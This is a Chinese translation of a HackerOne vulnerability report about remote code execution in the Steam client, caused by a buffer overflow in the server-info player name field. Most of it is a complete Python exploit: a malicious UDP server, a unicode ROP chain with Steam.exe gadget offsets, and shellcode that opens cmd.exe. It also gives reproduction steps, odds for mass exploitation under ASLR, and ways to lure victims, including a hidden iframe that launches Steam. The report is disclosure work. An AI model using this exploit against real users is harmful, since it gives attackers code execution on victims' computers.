@@ -1,0 +1,291 @@
+# 通过Server Info中的缓冲区溢出实现Steam客户端RCE
+
+阅读量 **359092**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-03-19 12:00:33
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 hackerone，文章来源：hackerone.com
+
+原文地址：<https://hackerone.com/reports/470520>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## 介绍
+
+在Steam和其他V社游戏（比如CSGO，Half-Life，TF2）中，内置了一种寻找服务器浏览器（server
+browser，一种游戏服务器）的功能。为了获取有关这些服务器的信息，服务器浏览器使用一种称为[服务器查询](https://developer.valvesoftware.com/wiki/Server_queries)（[server
+queries](https://developer.valvesoftware.com/wiki/Server_queries)）的特定UDP协议进行通信（该协议的详情可以参考Steam在线开发手册）。我们实现了一个自定义的python服务器，它只使用文档中提供的信息回复协议。在成功实现协议之后，我们fuzz了几个参数，发现Steam客户端在从自定义服务器接收回复时崩溃了。具体是我们在`A2S_PLAYER`响应中使用了一个过大的玩家名称来回复，导致客户端崩溃。通过attach调试器，我们发现是基于堆栈的缓冲区溢出导致了客户端的崩溃。显然存在问题，我们为此进一步深入研究来实现对缓冲区溢出的利用。我们定位到是`serverbrowser`库中发生了溢出。在某些情况下玩家名称被转换为unicode，加之缺乏边界检查，使得溢出发生。同时，由于没有canary保护，使得我们能够覆盖返回地址并在Windows上执行任意代码。
+
+## 利用细节
+
+我们试着证明影响来创建漏洞。首先，我们在Linux上测试，通过覆盖返回地址直接控制执行流程。但是Linux下，我们只能控制`EIP`寄存器的两个字节（例如`0x00004141`），因此我们没有继续跟进下去。在OSX上，进程被`SIGABRT`信号终止，这意味着OSX库中可能存在一个canary保护。在之后Windows端的尝试中（在Windows
+8.1和10上测试），我们最终成功实现了利用。在Windows上，通过UDP发送玩家名称——`A*1100`会形成以下堆栈布局：
+
+    
+    
+    0x00410041
+    0x00410041
+    ...
+    
+
+原因是unicode转换（wide-char）（玩家名称可以使用unicode字符）。以unicode字符形式发送玩家名称——`u"u4141"*1100`会形成以下布局：
+
+    
+    
+    0x41414141
+    0x41414141
+    ...
+    
+
+我们在函数返回之前破坏了堆栈和寄存器，所以无法控制`EIP`寄存器。程序在解引用`edi`寄存器后崩溃了，但是我们还是取得了控制。我们是通过`Steam.exe`二进制文件中的常量值来满足这些特殊条件的：
+
+![](https://cdn.nlark.com/yuque/0/2019/png/162341/1552709863811-8c5ca11d-e795-4ea9-b3f3-9809a7f02a2d.png#align=left&display=inline&height=621&name=image.png&originHeight=1242&originWidth=1134&size=208546&status=done&width=567)
+
+然后，我们构造了一个unicode ROP链（带有来自`Steam.exe` _的gadget_
+），通过动态调用`VirtualProtect`使得堆栈栈可执行，从而跳转到我们的unicode
+shellcode来执行`cmd.exe`。这还是很有难度的，因为我们不能在ROP链中使用像`0x00000040`这样的值，因为字符串会被中断。我们还不能使用像`u"uda01"这样`无效的unicode字符，因为库会将它们替换成问号`?`–
+`0x003F`。 **注意：** 所有内容都是使用`Steam.exe`基址来计算的。重新启动Steam不会改变地址，除非重新启动Windows
+8或Windows
+10。如果在漏洞利用中编辑基址，漏洞成功率还是100％的。只是因为ASLR，我们没法提前知道受害者计算机中的基址（，所以没法保证成功率）。不过，我们还是有两种解决方案：
+
+  * 只随机化9位：成功利用概率可以达到0.2％（1/512）。如果是向所有Steam用户批量分发此漏洞，平均每512次尝试产生1名受害者，这点概率足够了。
+  * 这个漏洞也许能够与其他内存泄漏漏洞结合利用，从而使成功率达到100％。
+
+## 复现步骤
+
+首先，确保安装Steam。如果使用的是测试版，需要在漏洞利用代码中取消注释测试版代码——`ROP gadgets for Steam.exe Beta
+Dec 14 2018`。
+
+1 – 下载附件：[steam_serverinfo_exploit.py（F395515）](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/515/d0678ca100f35dec0997c71f22bea8a4f3f03427/steam_serverinfo_exploit.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDZSX76B%2F20190316%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20190316T043257Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=FQoGZXIvYXdzEF0aDM%2B3L8nT3qPLPt7bQyK3A3VewrgTpcoNjIEy4r1vPRvYmtTxi35z0TiBFNUkGQXG063xN22pPmmo%2BiQWo%2FklIDMcEqWN2K0pPLzex19CIPyTG75UTs%2FvKi1bAuvcn%2FuEKRCUHRCUUYreLEKdvbxkZ3rUVDqjKFHVuqi5k6cH7Ritue4FNpCw5qZXAXB9FzGVyOVfqv9Fb84JccO6nTQM5TLpvdbtYQ6W1Ca5STeB7q8qDNsKL%2FNgQ6h29epnkYSAv41WrqDOOMyjGcAioLKO8Vv7AQfi5nU9scAx3DY2O88COkshE2Ta9rw%2FtRNGnuDVR6LltXQddrFMUQGRbcNMHR2MO%2FCritWYULDJlYONduNpuBT8IQjBZTT8iulEkY7c3%2Fb1CaMZAZTAOd2TewHhDjbvrx6EGnXANS6HRDl6Mmbi9e55bw%2BqQMyvxYRxEzq2z6ZxaBoStHC4Iugc299FfFXYuz0V69xncSrQgx8HJpiJcyULHKUuWYTxtlmmyfqFiECPnX1uClRtmk4GBxF2d09eVVmKTaKYsVgWdKRH9%2B68DUdM7i6keJLH7ukwGtqw%2BzFHLloUdUIfQkD2eucQDBq3RwDkmKMouuKx5AU%3D&X-Amz-Signature=d5d921f45f69e5df52e74987491c693c73e5a8a760ad54a324f7b3b477f02270)
+
+2 – 使用像Immunity Debugger的调试器并attach到Steam.exe
+
+3 – 获取`Steam.exe`的基地址（View> Executable
+modules）并编辑`STEAM_BASE`变量`steam_serverinfo_exploit.py`以使漏洞利用100％成功
+
+[](https://hackerone.com/reports/470520#)
+
+4 – 在服务器上运行漏洞利用（例如localhost）：`python steam_serverinfo_exploit.py`
+
+``5 – 编辑`POC.html`，在`iframe src`中并更改服务器的IP地址
+
+6 – 在浏览器中打开它并等待`cmd.exe`执行
+
+7 – 也可以在菜单中打开服务器浏览器（View > Servers）并点击`View server
+info`来触发漏洞（如果在同一网络下运行服务器，它将出现在LAN部分中）
+
+## PoC
+
+**Steamclient_POC_Windows10.mp4** ：包含在Windows
+10上通过与Steam服务器浏览器手动交互触发漏洞的视频。视频见[原文](https://hackerone.com/reports/470520#)。
+**SteamURL_POC_Windows10.mp4** ：包含在Windows
+10上通过访问恶意网页（其中包含一个隐藏iframe）触发漏洞的视频。视频中，访问恶意页面时未运行Steam，（Steam）会在访问页面后自动启动。当然（这种利用方式）在Steam运行时也有效。视频见[原文](https://hackerone.com/reports/470520#)。[POC.html（F395519）](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/519/52faa3f25db93d93150d33ecf040cb79b4ff7884/POC.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQW5FOF7XG%2F20190316%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20190316T031433Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=FQoGZXIvYXdzEFwaDGYfWRE6Vo9tPNZsUyK3A0JcL6Kc4x2VsD657zFbLHatBrTlPAzMA%2Fh47nInrfYmRaLSOTZXH%2BdMlieArgymWoFS8ClHF1oKS%2BwNT8pOuvskQFpGWeqbSZzGi%2B%2BawN0lbgfOOwBiyPyC0CP7Pfpa%2BXEf21RHHpZbiwY46YjmvhE%2BSXlb38Plhqn68CAPVhkJBJnrj7NCHDCVo6TlVqrBFolhPNp1oxCxwh9moVZ0h7zt1Kxw9syBqSRGvlkuqdjnL3Q3I7EjAwFfBbh3jOPwd5d2Ev0mx7RlHC84DAnLEvWTqWyw5VAmhykbsc5QvYRnGNn5jSdxvyUwiF0SQtCRDa0NZSNz4SIl%2Bax3x85%2Ft8BiNC8Qo8Or%2FL2UCFFThY33sSvVhJmQAtkRTMfBWMgx1kaM7yg%2FjF0T2K3bxIr0IrkYi6Wgs8cjUpHetpQs0rkMrF10XKESvrLcfd%2FglVTntG%2BBmMQV%2BDGOau3FtmfqrGKpDxLrjtlVWHiTzn9IFjFcX3owQ1jRwihNn%2B55rN%2FxStNXT3mSstE%2FVD60BIRhuJdctWhqaOaatYZ5RVC2MJHqEBnbuXoKouq2IMUvAakvRVKYsZgAYvkolLex5AU%3D&X-Amz-Signature=d789db3e28f2554fed6f1197a4375836f277c99900200028afb4b76f2bb0e68f)包含
+**SteamURL_POC_Windows10.mp4** 视频中使用的html页面代码。
+
+**利用代码：**
+
+    
+    
+    import logging
+    import socket
+    import textwrap
+    ### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######
+    # More info: https://developer.valvesoftware.com/wiki/Server_queries
+    # Shellcode must contain valid unicode characters, pad with NOPs :)
+    STEAM_BASE = 0x01180000
+    # Shellcode: open cmd.exe
+    shellcode = "x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax90x8bx52x78x01xdax8bx72x20x90x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x90x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex90x01xdax31xf6x89xd6x31xffx89xdfx31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x54x53xffxd2x83xc4x0cx31xc9x68x65x73x73x42x88x4cx24x03x68x50x72x6fx63x68x45x78x69x74x54x57x31xffx89xc7xffxd6x83xc4x0cx31xc9x51x68x64x6cx6cx41x88x4cx24x03x68x6cx33x32x2ex68x73x68x65x6cx54x31xd2x89xfax89xc7xffxd2x83xc4x0bx31xc9x68x41x42x42x42x88x4cx24x01x68x63x75x74x65x68x6cx45x78x65x68x53x68x65x6cx54x50xffxd6x83xc4x0dx31xc9x68x65x78x65x41x88x4cx24x03x68x63x6dx64x2ex54x59x31xd2x42x52x31xd2x52x52x51x52x52xffxd0xffxd7"
+    def udp_server(host="0.0.0.0", port=27015):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        print("[*] Starting TSQuery UDP server on host: %s and port: %s" % (host, port))
+        s.bind((host, port))
+        while True:
+            (data, addr) = s.recvfrom(128*1024)
+            requestType = checkRequestType(data)
+            if requestType == "INFO":
+                response = createINFOReply()
+            elif requestType == "PLAYER":
+                response = createPLAYERReply()
+                print("[+] Payload sent!")
+            else:
+                response = 'nope'
+            s.sendto(response,addr)
+            yield data
+    def checkRequestType(data):
+        # Header byte contains the type of request
+        header = data[4]
+        if header == "x54":
+            print("[*] Received A2S_INFO request")
+            return "INFO"
+        elif header == "x55":
+            print("[*] Received A2S_PLAYER request")
+            return "PLAYER"
+        else:
+            print "Unknown request"
+            return "UNKNOWN"
+    def createINFOReply():
+        # A2S_INFO response
+        # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.
+        pre = "xFFxFFxFFxFF"                         # Pre (4 bytes)
+        header = "x49"                                  # Header (1 byte)
+        protocol = "x02"                                # Protocol version (1 byte)
+        name = "@Kernelpanic and [@0xacb](/0xacb) Server" + "x00" # Server name (string)
+        map_name = "de_dust2" + "x00" # Map name (string)
+        folder = "csgo" + "x00" # Name of the folder contianing the game files (string)
+        game = "Counter-Strike: Global Offensive" + "x00" # Game name (string)
+        ID = "xdax02" # Game ID (short)
+        players = "xFF" # Amount of players in the server (byte)
+        maxplayers = "xFF" # Max player allowed (byte)
+        bots = "x00" # Bots in game (byte)
+        server_type = "d" # Server type, d = dedicate (byte)
+        environment = "l" # Hosted on windows linux or mac, l is linux (byte)
+        visibility = "x00" # Password needed? (byte)
+        VAC = "x01" # VAC enabled? (byte)
+        version = "1.3.6.7.1x00"
+        return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version
+    def to_unicode(addr):
+        a = addr & 0xffff;
+        b = addr >> 16;
+        return eval('u"\u%s\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))
+    def convert_addr(gadget):
+        return to_unicode(STEAM_BASE + gadget - 0x400000)
+    def convert_shellcode(code):
+        code = code + "x90"*8 #pad with nops
+        output = ""
+        l = textwrap.wrap(code.encode("hex"), 2)
+        for i in range(0, len(l)-4, 4):
+            output += "\u%s%s\u%s%s" % (l[i+1], l[i], l[i+3], l[i+2])
+        return eval('u"%s"' % output)
+    def pwn():
+        print("[*] Building ROP chain")
+        # ROP gadgets for Steam.exe Nov 26 2018
+        pop_eax = convert_addr(0x503ca7)
+        pop_ecx = convert_addr(0x41bd9f)
+        pop_edx = convert_addr(0x413a53)
+        pop_ebx = convert_addr(0x40511c)
+        pop_ebp = convert_addr(0x40247c)
+        pop_esi = convert_addr(0x404de6)
+        pop_edi = convert_addr(0x423839)
+        jmp_esp = convert_addr(0x4413bd)
+        pushad = convert_addr(0x425e00)
+        ret_nop = convert_addr(0x401212)
+        mov_edx_eax = convert_addr(0x5599a6)
+        sub_eax_41e82c6a = convert_addr(0x51584f)
+        mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)
+        mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
+        xchg_eax_esi = convert_addr(0x543b86)
+        writable_addr = convert_addr(0x69a01c)
+        virtual_protect_idata = convert_addr(0x5f9280)
+        new_protect = to_unicode(0x41e82c6a+0x40)
+        msize = to_unicode(0x41e82c6a+0x501)
+        '''
+        # ROP gadgets for Steam.exe Beta Dec 14 2018
+        pop_eax = convert_addr(0x425993)
+        pop_ecx = convert_addr(0x41bd9f)
+        pop_edx = convert_addr(0x413a53)
+        pop_ebx = convert_addr(0x40511c)
+        pop_ebp = convert_addr(0x40247c)
+        pop_esi = convert_addr(0x404de6)
+        pop_edi = convert_addr(0x423839)
+        jmp_esp = convert_addr(0x4413bd)
+        pushad = convert_addr(0x425e00)
+        ret_nop = convert_addr(0x401212)
+        mov_edx_eax = convert_addr(0x559d46)
+        sub_eax_31e82c6a = convert_addr(0x515bbf)
+        mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)
+        mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
+        xchg_eax_esi = convert_addr(0x515b5e)
+        writable_addr = convert_addr(0x69a01c)
+        virtual_protect_idata = convert_addr(0x5fa280)
+        new_protect = to_unicode(0x31e82c6a+0x40)
+        msize = to_unicode(0x31e82c6a+0x501)
+        '''
+        rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret 
+                  + u"ub33fubeef" + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 
+                  + pop_ecx + writable_addr 
+                  + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax 
+                  + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata 
+                  + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u"ub33fubeef" + xchg_eax_esi + pop_edi 
+                  + ret_nop + pop_eax + u"u9090u9090" + pushad
+        #special conditions to avoid crashes
+        special_condition_1 = to_unicode(STEAM_BASE + 0x10)
+        special_condition_2 = to_unicode(STEAM_BASE + 0x11)
+        payload = "A"*1024 + u"ub33fubeef"*12 + special_condition_1 + special_condition_2*31 + rop + shellcode
+        return payload.encode("utf-8") + "x00"
+    def createPLAYERReply():
+        # A2S_player response
+        # This query retrieves information about the players currently on the server.
+        pre = "xFFxFFxFFxFF"                        # Pre (4 bytes)
+        header = "x44"                                 # Header (1 byte)
+        players = "x01"                                # Amount of players (1 byte)
+        indexPlayer1 = "x01"                           # Index of player (1 byte)
+        namePlayer2 = pwn()
+        scorePlayer2 = ""
+        durationPlayer2  = ""
+        return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2
+    FORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8st%(message)s'
+    logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)
+    if __name__ == "__main__":
+        shellcode = convert_shellcode(shellcode)
+        for data in udp_server():
+            pass
+    
+
+## 影响
+
+任何Steam用户访问恶意服务器上Server
+Info，就能使攻击者在其计算机上执行任意代码。通常，攻击者可以通过启动与C2的后门连接来获取对受害者计算机的访问权限。这样一来，就可以为所欲为了（接管账户、窃取Steam帐户中的所有项目、在操作系统中安装其他恶意软件、泄露文档等等）有几种方法可以诱骗用户运行漏洞利用程序：
+
+  * 用户在Steam客户端服务器浏览器中查看服务器信息
+  * 用户访问启动[Steam浏览器协议](https://hackerone.com/redirect?signature=2bba3c8b42aad60d652baa9526c0d2162ad40124&url=https%3A%2F%2Fdeveloper.valvesoftware.com%2Fwiki%2FSteam_browser_protocol)请求的恶意网页 `steam://connect/1.2.3.4`
+
+此外，还有一些方法可以增加该攻击成功的可能性：
+
+  * 通过使用Steam浏览器协议的网站来触发。
+  * 许多用户不需要单击浏览器上的`Open Steam`按钮（勾选诸如“始终在关联应用程序中打开该类型链接”的选项）
+  * 第一个Info Reply（不包含利用漏洞）可以通过包含一些有趣的值来欺骗用户。 
+    * 可以选择服务器名称，从而欺骗用户使用该服务器。
+    * 通过设置当前玩家数量，吸引更多的人加入。
+    * 地图名称还可以设成有趣的文本来吸引人们。
+    * 如果服务器中的玩家数量等于服务器中允许的最大玩家数量，服务器信息框就会自动弹开。漏洞在弹开的信息框第一次自动刷新后就能利用成功。
+
+本文翻译自hackerone.com [原文链接](https://hackerone.com/reports/470520)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Liqueur** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/173466](/post/id/173466)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [hackerone.com](https://hackerone.com/reports/470520)
+
+如若转载,请注明出处： <https://hackerone.com/reports/470520>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [RCE](/tag/RCE)
+  * [终端安全](/tag/终端安全)
+  * [Steam](/tag/Steam)
+
+ **+1** __7赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) Liqueur
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
